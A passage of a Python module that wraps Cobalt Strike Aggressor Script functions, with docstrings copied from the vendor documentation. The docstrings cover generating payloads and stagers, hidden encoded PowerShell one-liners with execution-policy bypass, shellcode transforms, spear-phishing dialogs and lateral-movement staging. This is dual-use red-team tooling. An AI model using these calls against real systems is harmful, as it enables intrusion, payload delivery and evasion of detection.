            }
        }

    """

    return engine.call('openPortScannerLocal', args, fork=fork, sync=sync)


def openPowerShellWebDialog(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Open the dialog to setup the PowerShell Web Delivery Attack
        Example
        openPowerShellWebDialog();

    """

    return engine.call('openPowerShellWebDialog', args, fork=fork, sync=sync)


def openPreferencesDialog(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Open the preferences dialog
        Example
        openPreferencesDialog();

    """

    return engine.call('openPreferencesDialog', args, fork=fork, sync=sync)


def openProcessBrowser(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Open a process browser for one or more Beacons
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        Example
        item "Processes" {
            openProcessBrowser($1);
        }

    """

    return engine.call('openProcessBrowser', args, fork=fork, sync=sync)


def openSOCKSBrowser(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Open the tab to list SOCKS proxy servers
        Example
        openSOCKSBrowser();

    """

    return engine.call('openSOCKSBrowser', args, fork=fork, sync=sync)


def openSOCKSSetup(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        open the SOCKS proxy server setup dialog
        Arguments
        $1 - the Beacon ID to apply this feature to
        Example
        item "SOCKS Server" {
            local('$bid');
            foreach $bid ($1) {
                openSOCKSSetup($bid);
            }
        }

    """

    return engine.call('openSOCKSSetup', args, fork=fork, sync=sync)


def openScreenshotBrowser(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Open the screenshot browser tab
        Example
        openScreenshotBrowser();

    """

    return engine.call('openScreenshotBrowser', args, fork=fork, sync=sync)


def openScriptConsole(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Open the Aggressor Script console.
        Example
        openScriptConsole();

    """

    return engine.call('openScriptConsole', args, fork=fork, sync=sync)


def openScriptManager(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Open the tab for the script manager.
        Example
        openScriptManager();

    """

    return engine.call('openScriptManager', args, fork=fork, sync=sync)


def openScriptedWebDialog(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Open the dialog to setup a Scripted Web Delivery Attack
        Example
        openScriptedWebDialog();

    """

    return engine.call('openScriptedWebDialog', args, fork=fork, sync=sync)


def openServiceBrowser(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Open service browser dialog
        Arguments
        $1 - an array of targets to show services for
        Example
        openServiceBrowser(@("192.168.1.3"));

    """

    return engine.call('openServiceBrowser', args, fork=fork, sync=sync)


def openSiteManager(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Open the site manager.
        Example
        openSiteManager();

    """

    return engine.call('openSiteManager', args, fork=fork, sync=sync)


def openSpawnAsDialog(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Open dialog to spawn a payload as another user
        Arguments
        $1 - the Beacon ID to apply this feature to
        Example
        item "Spawn As..." {
            local('$bid');
            foreach $bid ($1) {
                openSpawnAsDialog($bid);
            }
        }

    """

    return engine.call('openSpawnAsDialog', args, fork=fork, sync=sync)


def openSpearPhishDialog(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Open the dialog for the spear phishing tool.
        Example
        openSpearPhishDialog();

    """

    return engine.call('openSpearPhishDialog', args, fork=fork, sync=sync)


def openSystemInformationDialog(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Open the system information dialog.
        Example
        openSystemInformationDialog();

    """

    return engine.call('openSystemInformationDialog', args, fork=fork, sync=sync)


def openSystemProfilerDialog(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Open the dialog to setup the system profiler.
        Example
        openSystemProfilerDialog();

    """

    return engine.call('openSystemProfilerDialog', args, fork=fork, sync=sync)


def openTargetBrowser(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Open the targets browser
        Example
        openTargetBrowser();

    """

    return engine.call('openTargetBrowser', args, fork=fork, sync=sync)


def openWebLog(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Open the web log tab.
        Example
        openWebLog();

    """

    return engine.call('openWebLog', args, fork=fork, sync=sync)


def openWindowsDropperDialog(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        REMOVED Removed in Cobalt Strike 4.0.
    """

    return engine.call('openWindowsDropperDialog', args, fork=fork, sync=sync)


def openWindowsExecutableDialog(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Open the dialog to generate a Windows executable
        Example
        openWindowsExecutableDialog();

    """

    return engine.call('openWindowsExecutableDialog', args, fork=fork, sync=sync)


def openWindowsExecutableStage(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Open the dialog to generate a stageless Windows executable
        Example
        openWindowsExecutableStage();

    """

    return engine.call('openWindowsExecutableStage', args, fork=fork, sync=sync)


def payload(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Exports a raw payload for a specific Cobalt Strike listener
        Arguments
        $1 - the listener name
        $2 - x86|x64 the architecture of the payload
        $3 - exit method: 'thread' (leave the thread when done) or 'process' (exit the process when done). Use 'thread' if injecting into an existing process.
        Returns
        A scalar containing position-independent code for the specified listener.
        Example
        $data = payload("my listener", "x86", "process");

        $handle = openf(">out.bin");
        writeb($handle, $data);
        closef($handle);

    """

    return engine.call('payload', args, fork=fork, sync=sync)


def payload_bootstrap_hint(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Get the offset to function pointer hints used by Beacon's Reflective Loader. Populate these hints with the asked-for process addresses to have Beacon load itself into memory in a more OPSEC-safe way.
        Arguments
        $1 - the payload position-independent code (specifically, Beacon)
        $2 - the function to get the patch location for
        Notes
        Cobalt Strike's Beacon has a protocol to accept artifact-provided function pointers for functions required by Beacon's Reflective Loader. The protocol is to patch the location of GetProcAddress and GetModuleHandleA into the Beacon DLL. Use of this protocol allows Beacon to load itself in memory without triggering shellcode detection heuristics that monitor reads of kernel32's Export Address Table. This protocol is optional. Artifacts that don't follow this protocol will fallback to resolving key functions via the Export Address Table.
        The Artifact Kit and Resource Kit both implement this protocol. Download these kits to see how to use this function.
        Returns
        The offset to a memory location to patch with a pointer for a specific function used by Beacon's Reflective Loader.

    """

    return engine.call('payload_bootstrap_hint', args, fork=fork, sync=sync)


def payload_local(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Exports a raw payload for a specific Cobalt Strike listener. Use this function when you plan to spawn this payload from another Beacon session. Cobalt Strike will generate a payload that embeds key function pointers, needed to bootstrap the agent, taken from the parent session's metadata.
        Arguments
        $1 - the parent Beacon session ID
        $2 - the listener name
        $3 - x86|x64 the architecture of the payload
        $4 - exit method: 'thread' (leave the thread when done) or 'process' (exit the process when done). Use 'thread' if injecting into an existing process.
        Returns
        A scalar containing position-independent code for the specified listener.
        Example
        $data = payload_local($bid, "my listener", "x86", "process");

        $handle = openf(">out.bin");
        writeb($handle, $data);
        closef($handle);

    """

    return engine.call('payload_local', args, fork=fork, sync=sync)


def pgraph(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Generate the pivot graph GUI component.
        Returns
        The pivot graph GUI object (a javax.swing.JComponent)
        Example
        addVisualization("Pivot Graph", pgraph());

        See Also
        &showVisualization

    """

    return engine.call('pgraph', args, fork=fork, sync=sync)


def pivots(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Returns a list of SOCKS pivots from Cobalt Strike's data model.
        Returns
        An array of dictionary objects with information about each pivot.
        Example
        printAll(pivots());

    """

    return engine.call('pivots', args, fork=fork, sync=sync)


def popup_clear(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Remove all popup menus associated with the current menu. This is a way to override Cobalt Strike's default popup menu definitions.
        Arguments
        $1 - the popup hook to clear registered menus for
        Example
        popup_clear("help");

        popup help {
            item "My stuff!" {
                show_message("This is my menu!");
            }
        }

    """

    return engine.call('popup_clear', args, fork=fork, sync=sync)


def powershell(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        DEPRECATED This function is deprecated in Cobalt Strike 4.0. Use &artifact_stager and &powershell_command instead.
        Returns a PowerShell one-liner to bootstrap the specified listener.
        Arguments
        $1 - the listener name
        $2 - [true/false]: is this listener targeting local host?
        $3 - x86|x64 - the architecture of the generated stager.
        Notes
        Be aware that not all listener configurations have x64 stagers. If in doubt, use x86.
        Returns
        A PowerShell one-liner to run the specified listener.
        Example
        println(powershell("my listener", false));

    """

    return engine.call('powershell', args, fork=fork, sync=sync)


def powershell_command(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Returns a one-liner to run a PowerShell expression (e.g., powershell.exe -nop -w hidden -encodedcommand MgAgACsAIAAyAA==)
        Arguments
        $1 - the PowerShell expression to wrap into a one-liner.
        $2 - will the PowerShell command run on a remote target?
        Returns
        Returns a powershell.exe one-liner to run the specified expression.
        Example
        $cmd = powershell_command("2 + 2", false);
        println($cmd);

    """

    return engine.call('powershell_command', args, fork=fork, sync=sync)


def powershell_compress(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Compresses a PowerShell script and wraps it in a script to decompress and execute it.
        Arguments
        $1 - the PowerShell script to compress.
        Example
        $script = powershell_compress("2 + 2");

    """

    return engine.call('powershell_compress', args, fork=fork, sync=sync)


def powershell_encode_oneliner(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        DEPRECATED This function is deprecated in Cobalt Strike 4.0. Use &powershell_command instead.
        Returns a one-liner to run a PowerShell expression (e.g., powershell.exe -nop -w hidden -encodedcommand MgAgACsAIAAyAA==)
        Arguments
        $1 - the PowerShell expression to wrap into a one-liner.
        Returns a powershell.exe one-liner to run the specified expression.
        Example
        $cmd = powershell_encode_oneliner("2 + 2");
        println($cmd);

    """

    return engine.call('powershell_encode_oneliner', args, fork=fork, sync=sync)


def powershell_encode_stager(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        DEPRECATED This function is deprecated in Cobalt Strike 4.0. Use &artifact_general and &powershell_command instead.
        Returns a base64 encoded PowerShell script to run the specified shellcode
        Arguments
        $1 - shellcode to wrap
        Returns
        Returns a base64 encoded PowerShell suitable for use with powershell.exe's -enc option.
        Example
        $shellcode  = shellcode("my listener", false);
        $readytouse = powershell_encode_stager($shellcode);
        println("powershell.exe -ep bypass -enc $readytouse");

    """

    return engine.call('powershell_encode_stager', args, fork=fork, sync=sync)


def pref_get(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Grabs a string value from Cobalt Strike's preferences.
        Arguments
        $1 - the preference name
        $2 - the default value [if there is no value for this preference]
        Returns
        A string with the preference value.
        Example
        $foo = pref_get("foo.string", "bar");

    """

    return engine.call('pref_get', args, fork=fork, sync=sync)


def pref_get_list(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Grabs a list value from Cobalt Strike's preferences.
        Arguments
        $1 - the preference name
        Returns
        An array with the preference values
        Example
        @foo = pref_get_list("foo.list");

    """

    return engine.call('pref_get_list', args, fork=fork, sync=sync)


def pref_set(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Set a value in Cobalt Strike's preferences
        Arguments
        $1 - the preference name
        $2 - the preference value
        Example
        pref_set("foo.string", "baz!");

    """

    return engine.call('pref_set', args, fork=fork, sync=sync)


def pref_set_list(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Stores a list value into Cobalt Strike's preferences.
        Arguments
        $1 - the preference name
        $2 - an array of values for this preference
        Example
        pref_set_list("foo.list", @("a", "b", "c"));

    """

    return engine.call('pref_set_list', args, fork=fork, sync=sync)


def previousTab(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Activate the tab that is to the left of the current tab.
        Example
        bind Ctrl+Left {
            previousTab();
        }

    """

    return engine.call('previousTab', args, fork=fork, sync=sync)


def privmsg(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Post a private message to a user in the event log
        Arguments
        $1 - who to send the message to
        $2 - the message
        Example
        privmsg("raffi", "what's up man?");

    """

    return engine.call('privmsg', args, fork=fork, sync=sync)


def prompt_confirm(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Show a dialog with Yes/No buttons. If the user presses yes, call the specified function.
        Arguments
        $1 - text in the dialog
        $2 - title of the dialog
        $3 - a callback function. Called when the user presses yes.
        Example
        prompt_confirm("Do you feel lucky?", "Do you?", {
            show_mesage("Ok, I got nothing");
        });

    """

    return engine.call('prompt_confirm', args, fork=fork, sync=sync)


def prompt_directory_open(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Show a directory open dialog.
        Arguments
        $1 - title of the dialog
        $2 - default value
        $3 - true/false: allow user to select multiple folders?
        $4 - a callback function. Called when the user chooses a folder. The argument to the callback is the selected folder. If multiple folders are selected, they will still be specified as the first argument, separated by commas.
        Example
        prompt_directory_open("Choose a folder", $null, false, {
            show_message("You chose: $1");
        });

    """

    return engine.call('prompt_directory_open', args, fork=fork, sync=sync)


def prompt_file_open(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Show a file open dialog.
        Arguments
        $1 - title of the dialog
        $2 - default value
        $3 - true/false: allow user to select multiple files?
        $4 - a callback function. Called when the user chooses a file to open. The argument to the callback is the selected file. If multiple files are selected, they will still be specified as the first argument, separated by commas.
        Example
        prompt_file_open("Choose a file", $null, false, {
            show_message("You chose: $1");
        });

    """

    return engine.call('prompt_file_open', args, fork=fork, sync=sync)


def prompt_file_save(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Show a file save dialog.
        Arguments
        $1 - default value
        $2 - a callback function. Called when the user chooses a filename. The argument to the callback is the desired file.
        Example
        prompt_file_save($null, {
            local('$handle');
            $handle = openf("> $+ $1");
            println($handle, "I am content");
            closef($handle);
        });

    """

    return engine.call('prompt_file_save', args, fork=fork, sync=sync)


def prompt_text(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Show a dialog that asks the user for text.
        Arguments
        $1 - text in the dialog
        $2 - default value in the text field.
        $3 - a callback function. Called when the user presses OK. The first argument to this callback is the text the user provided.
        Example
        prompt_text("What is your name?", "Cyber Bob", {
            show_mesage("Hi $1 $+ , nice to meet you!");
        });

    """

    return engine.call('prompt_text', args, fork=fork, sync=sync)


def range(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Generate an array of numbers based on a string description of ranges.
        Arguments
        $1 - a string with a description of ranges


        Range
        Result


        103
        The number 103


        3-8
        The numbers 3, 4, 5, 6, and 7.


        2,4-6
        The numbers 2, 4, and 5.


        Returns
        An array of numbers within the specified ranges.
        Example
        printAll(range("2,4-6"));

    """

    return engine.call('range', args, fork=fork, sync=sync)


def redactobject(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Removes a post-exploitation object (e.g., screenshot, keystroke buffer) from the user interface.
        Arguments
        $1 - the ID of the post-exploitation object.
    """

    return engine.call('redactobject', args, fork=fork, sync=sync)


def removeTab(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Close the active tab
        Example
        bind Ctrl+D {
            removeTab();
        }

    """

    return engine.call('removeTab', args, fork=fork, sync=sync)


def resetData(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Reset Cobalt Strike's data model

    """

    return engine.call('resetData', args, fork=fork, sync=sync)


def say(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Post a public chat message to the event log.
        Arguments
        $1 - the message
        Example
        say("Hello World!");

    """

    return engine.call('say', args, fork=fork, sync=sync)


def sbrowser(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Generate the session browser GUI component. Shows Beacon AND SSH sessions.
        Returns
        The session browser GUI object (a javax.swing.JComponent)
        Example
        addVisualization("Session Browser", sbrowser());

        See Also
        &showVisualization

    """

    return engine.call('sbrowser', args, fork=fork, sync=sync)


def screenshots(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Returns a list of screenshots from Cobalt Strike's data model.
        Returns
        An array of dictionary objects with information about each screenshot.
        Example
        printAll(screenshots());

    """

    return engine.call('screenshots', args, fork=fork, sync=sync)


def script_resource(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Returns the full path to a resource that is stored relative to this script file.
        Arguments
        $1 - the file to get a path for
        Returns
        The full path to the specified file.
        Example
        println(script_resource("dummy.txt"));

    """

    return engine.call('script_resource', args, fork=fork, sync=sync)


def separator(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Insert a separator into the current menu tree.
        Example
        popup foo {
            item "Stuff" { ... }
            separator();
            item "Other Stuff" { ... }
        }

    """

    return engine.call('separator', args, fork=fork, sync=sync)


def services(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Returns a list of services in Cobalt Strike's data model.
        Returns
        An array of dictionary objects with information about each service.
        Example
        printAll(services());

    """

    return engine.call('services', args, fork=fork, sync=sync)


def shellcode(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        DEPRECATED This function is deprecated in Cobalt Strike 4.0. Use &stager instead.
        Returns raw shellcode for a specific Cobalt Strike listener
        Arguments
        $1 - the listener name
        $2 - true/false: is this shellcode destined for a remote target?
        $3 - x86|x64 - the architecture of the stager output.
        Notes
        Be aware that not all listener configurations have x64 stagers. If in doubt, use x86.
        Returns
        A scalar containing shellcode for the specified listener.
        Example
        $data = shellcode("my listener", false, "x86");

        $handle = openf(">out.bin");
        writeb($handle, $data);
        closef($handle);

    """

    return engine.call('shellcode', args, fork=fork, sync=sync)


def showVisualization(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Switch Cobalt Strike visualization to a registered visualization.
        Arguments
        $1 - the name of the visualization
        Example
        bind Ctrl+H {
            showVisualization("Hello World");
        }

        See Also
        &showVisualization

    """

    return engine.call('showVisualization', args, fork=fork, sync=sync)


def show_error(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Shows an error message to the user in a dialog box. Use this function to relay error information.
        Arguments
        $1 - the message text
        Example
        show_error("You did something bad.");

    """

    return engine.call('show_error', args, fork=fork, sync=sync)


def show_message(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Shows a message to the user in a dialog box. Use this function to relay information.
        Arguments
        $1 - the message text
        Example
        show_message("You've won a free ringtone");

    """

    return engine.call('show_message', args, fork=fork, sync=sync)


def site_host(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Host content on Cobalt Strike's web server
        Arguments
        $1 - the host for this site (&localip is a good default)
        $2 - the port (e.g., 80)
        $3 - the URI (e.g., /foo)
        $4 - the content to host (as a string)
        $5 - the mime-type (e.g., "text/plain")
        $6 - a description of the content. Shown in Attacks -> Web Drive-by -> Manage.
        $7 - use SSL or not (true or false)
        Returns
        The URL to this hosted site
        Example
        site_host(localip(), 80, "/", "Hello World!", "text/plain", "Hello World Page", false);

    """

    return engine.call('site_host', args, fork=fork, sync=sync)


def site_kill(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Remove a site from Cobalt Strike's web server
        Arguments
        $1 - the port
        $2 - the URI
        Example
        # removes the content bound to / on port 80
        site_kill(80, "/");

    """

    return engine.call('site_kill', args, fork=fork, sync=sync)


def sites(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Returns a list of sites tied to Cobalt Strike's web server.
        Returns
        An array of dictionary objects with information about each registered site.
        Example
        printAll(sites());

    """

    return engine.call('sites', args, fork=fork, sync=sync)


def ssh_command_describe(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Describe an SSH command.
        Returns
        A string description of the SSH command.
        Arguments
        $1 - the command
        Example
        println(beacon_command_describe("sudo"));

    """

    return engine.call('ssh_command_describe', args, fork=fork, sync=sync)


def ssh_command_detail(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Get the help information for an SSH command.
        Returns
        A string with helpful information about an SSH command.
        Arguments
        $1 - the command
        Example
        println(ssh_command_detail("sudo"));

    """

    return engine.call('ssh_command_detail', args, fork=fork, sync=sync)


def ssh_command_register(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Register help information for an SSH console command.
        Arguments
        $1 - the command
        $2 - the short description of the command
        $3 - the long-form help for the command.
        Example
        ssh_alis echo {
            blog($1, "You typed: " . substr($1, 5));
        }

        ssh_command_register(
            "echo",
            "echo posts to the current session's log",
            "Synopsis: echo [arguments]\n\nLog arguments to the SSH console");

    """

    return engine.call('ssh_command_register', args, fork=fork, sync=sync)


def ssh_commands(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Get a list of SSH commands.
        Returns
        An array of SSH commands.
        Example
        printAll(ssh_commands());

    """

    return engine.call('ssh_commands', args, fork=fork, sync=sync)


def stager(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Returns the stager for a specific Cobalt Strike listener
        Arguments
        $1 - the listener name
        $2 - x86|x64 - the architecture of the stager output.
        Notes
        Be aware that not all listener configurations have x64 stagers. If in doubt, use x86.
        Returns
        A scalar containing shellcode for the specified listener.
        Example
        $data = stager("my listener", "x86");

        $handle = openf(">out.bin");
        writeb($handle, $data);
        closef($handle);

    """

    return engine.call('stager', args, fork=fork, sync=sync)


def stager_bind_pipe(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Returns a bind_pipe stager for a specific Cobalt Strike listener. This stager is suitable for use in lateral movement actions that benefit from a small named pipe stager. Stage with &beacon_stage_pipe.
        Arguments
        $1 - the listener name
        Returns
        A scalar containing x86 bind_pipe shellcode.
        Example
        # step 1. generate our stager
        $stager = stager_bind_pipe("my listener");

        # step 2. do something to run our stager

        # step 3. stage a payload via this stager
        beacon_stage_pipe($bid, $target, "my listener", "x86");

        # step 4. assume control of the payload (if needed)
        beacon_link($bid, $target, "my listener");

        See Also
        &artifact_general
    """

    return engine.call('stager_bind_pipe', args, fork=fork, sync=sync)


def stager_bind_tcp(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Returns a bind_tcp stager for a specific Cobalt Strike listener. This stager is suitable for use in localhost-only actions that require a small stager. Stage with &beacon_stage_tcp.
        Arguments
        $1 - the listener name
        $2 - x86|x64 - the architecture of the stager output.
        $3 - the port to bind to
        Returns
        A scalar containing bind_tcp shellcode
        Example
        # step 1. generate our stager
        $stager = stager_bind_tcp("my listener", "x86", 1234);

        # step 2. do something to run our stager

        # step 3. stage a payload via this stager
        beacon_stage_tcp($bid, $target, 1234, "my listener", "x86");

        # step 4. assume control of the payload (if needed)
        beacon_link($bid, $target, "my listener");

        See Also
        &artifact_general

    """

    return engine.call('stager_bind_tcp', args, fork=fork, sync=sync)


def str_chunk(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Chunk a string into multiple parts
        Arguments
        $1 - the string to chunk
        $2 - the maximum size of each chunk
        Returns
        The original string split into multiple chunks
        Example
        # hint... :)
        else if ($1 eq "template.x86.ps1") {
            local('$enc');
            $enc = str_chunk(base64_encode($2), 61);
            return strrep($data, '%%DATA%%', join("' + '", $enc));
        }

    """

    return engine.call('str_chunk', args, fork=fork, sync=sync)


def str_decode(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Convert a string of bytes to text with the specified encoding.
        Arguments
        $1 - the string to decode
        $2 - the encoding to use.
        Returns
        The decoded text.
        Example
        # convert back to a string we can use (from UTF16-LE)
        $text = str_decode($string, "UTF16-LE");

    """

    return engine.call('str_decode', args, fork=fork, sync=sync)


def str_encode(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Convert text to byte string with the specified character encoding.
        Arguments
        $1 - the string to encode
        $2 - the encoding to use
        Returns
        The resulting string.
        Example
        # convert to UTF16-LE
        $encoded = str_encode("this is some text", "UTF16-LE");

    """

    return engine.call('str_encode', args, fork=fork, sync=sync)


def str_xor(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Walk a string and XOR it with the provided key.
        Arguments
        $1 - the string to mask
        $2 - the key to use (string)
        Returns
        The original string masked with the specified key.
        Example
        $mask  = str_xor("This is a string", "key");
        $plain = str_xor($mask, "key");

    """

    return engine.call('str_xor', args, fork=fork, sync=sync)


def sync_download(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Sync a downloaded file (View -> Downloads) to a local path.
        Arguments
        $1 - the remote path to the file to sync. See &downloads
        $2 - where to save the file locally
        $3 - [optional] a callback function to execute when download is synced. The first argument to this function is the local path of the downloaded file.
        Example
        # sync all downloads
        command ga {
            local('$download $lpath $name $count');
            foreach $count => $download (downloads()) {
                ($lpath, $name) = values($download, @("lpath", "name"));

                sync_download($lpath, script_resource("file $+ .$count"), lambda({
                    println("Downloaded $1 [ $+ $name $+ ]");
                }, \$name));
            }
        }

    """

    return engine.call('sync_download', args, fork=fork, sync=sync)


def targets(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Returns a list of host information in Cobalt Strike's data model.
        Returns
        An array of dictionary objects with information about each host.
        Example
        printAll(targets());

    """

    return engine.call('targets', args, fork=fork, sync=sync)


def tbrowser(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Generate the target browser GUI component.
        Returns
        The target browser GUI object (a javax.swing.JComponent)
        Example
        addVisualization("Target Browser", tbrowser());

        See Also
        &showVisualization

    """

    return engine.call('tbrowser', args, fork=fork, sync=sync)


def tokenToEmail(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Covert a phishing token to an email address.
        Arguments
        $1 - the phishing token
        Returns
        The email address or "unknown" if the token is not associated with an email.
        Example
        set PROFILER_HIT {
            local('$out $app $ver $email');
            $email = tokenToEmail($5);
            $out = "\c9[+]\o $1 $+ / $+ $2 [ $+ $email $+ ] Applications";
            foreach $app => $ver ($4) {
                $out .= "\n\t $+ $[25]app $ver";
            }
            return "$out $+ \n\n";
        }

    """

    return engine.call('tokenToEmail', args, fork=fork, sync=sync)


def transform(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Transform shellcode into another format.
        Arguments
        $1 - the shellcode to transform
        $2 - the transform to apply


        Type
        Description


        array
        comma separated byte values


        hex
        Hex-encode the value


        powershell-base64
        PowerShell.exe-friendly base64 encoder


        vba
        a VBA array() with newlines added in


        vbs
        a VBS expression that results in a string


        veil
        Veil-ready string (\x##\x##)


        Returns
        The shellcode after the specified transform is applied
        Example
        println(transform("This is a test!", "veil"));

    """

    return engine.call('transform', args, fork=fork, sync=sync)


def transform_vbs(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Transform shellcode into a VBS expression that results in a string
        Arguments
        $1 - the shellcode to transform
        $2 - the maximum length of a plaintext run
        Notes
        Previously, Cobalt Strike would embed its stagers into VBS files as several Chr() calls concatened into a string.
        Cobalt Strike 3.9 introduced features that required larger stagers. These larger stagers were too big to embed into a VBS file with the above method.
